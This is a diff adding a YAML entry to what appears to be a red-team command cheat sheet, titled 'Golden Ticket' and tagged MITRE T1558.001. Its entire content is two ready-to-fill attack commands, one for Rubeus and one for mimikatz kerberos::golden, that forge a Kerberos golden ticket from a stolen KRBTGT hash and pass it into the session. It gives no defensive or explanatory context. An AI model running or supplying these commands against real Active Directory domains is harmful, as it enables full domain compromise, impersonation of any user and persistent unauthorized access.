@@ -1,0 +1,15 @@
+name: "Golden Ticket"
+mitre_technique_id: "T1558.001"
+sections:
+- title: "Golden Ticket - Forge"
+  tabs:
+  - title: "Rubeus"
+    content: |
+      ```
+      rubeus.exe golden /aes256:{{KRBTGT_HASH}} /ldap /user:{{TARGET_DOMAIN_USER}} /ptt
+      ```
+  - title: "mimikatz"
+    content: |
+      ```
+      kerberos::golden /domain:{{DOMAIN_NAME}} /sid:{{DOMAIN_SID}} /aes256:{{KRBTGT_HASH}} /user:{{TARGET_DOMAIN_USER}} /ptt
+      ```
